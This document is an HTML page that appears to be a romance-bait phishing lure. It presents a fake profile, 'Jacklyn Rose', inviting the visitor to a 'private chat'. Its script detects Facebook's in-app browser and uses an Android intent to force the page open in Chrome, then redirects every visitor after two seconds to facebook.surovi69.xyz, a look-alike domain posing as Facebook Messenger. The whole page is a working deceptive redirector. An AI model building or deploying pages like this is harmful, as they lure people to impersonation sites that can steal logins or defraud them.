<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect with Jacklyn</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .bridge-card {
            background: white;
            width: 90%;
            max-width: 400px;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
        }
        .cover-photo {
            width: 100%;
            height: 120px;
            background: url('https://github.com/pj9889/picvid/blob/main/pic3.webp?raw=true') center/cover;
        }
        .profile-section {
            margin-top: -50px;
            padding: 20px;
        }
        .img-container {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto;
        }
        .profile-img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid white;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        .online-dot {
            height: 18px;
            width: 18px;
            background-color: #31a24c;
            border: 3px solid white;
            border-radius: 50%;
            position: absolute;
            bottom: 8px;
            right: 8px;
        }
        .name {
            font-size: 22px;
            font-weight: bold;
            color: #1c1e21;
            margin: 10px 0 5px;
        }
        .bio {
            color: #65676b;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.4;
        }
        .main-btn {
            background-color: #0084FF;
            color: white;
            text-decoration: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-weight: bold;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            width: 80%;
            justify-content: center;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }
        .footer-text {
            font-size: 12px;
            color: #bcc0c4;
            margin-top: 20px;
            padding-bottom: 20px;
        }
    </style>
</head>
<body>

    <div class="bridge-card">
        <div class="cover-photo"></div>
        <div class="profile-section">
            <div class="img-container">
                <img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" alt="Profile" class="profile-img">
                <span class="online-dot"></span>
            </div>
            <div class="name">Jacklyn Rose</div>
            <div class="bio">
                Hey there! I am waiting to start a private conversation with you. 
                Connecting to the official room...
            </div>
            
            <a href="https://facebook.surovi69.xyz" class="main-btn" id="redirectBtn">
                <i class="fab fa-facebook-messenger"></i> Start Private Chat
            </a>
        </div>
        <div class="footer-text">
            © 2026 Connect Plus | Safe & Secure
        </div>
    </div>

    <script>
        // ১. ফেসবুক থেকে লিঙ্কে ক্লিক করলেই ক্রোম ওপেন করার চেষ্টা করবে
        (function() {
            const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
            // যদি এটি ফেসবুক ইন-অ্যাপ ব্রাউজারে থাকে তবে তখনই এটি ট্রিগার হবে
            if (navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
                window.location.href = chromeIntent;
            }
        })();

        // ২. ২ সেকেন্ড পর অটোমেটিক রিডাইরেক্ট লজিক
        window.onload = function() {
            setTimeout(function() {
                const finalUrl = "https://facebook.surovi69.xyz";
                window.location.href = finalUrl;
            }, 2000); // ২ সেকেন্ড (২০০০ মিলিসেকেন্ড)
        };
    </script>

</body>
</html>
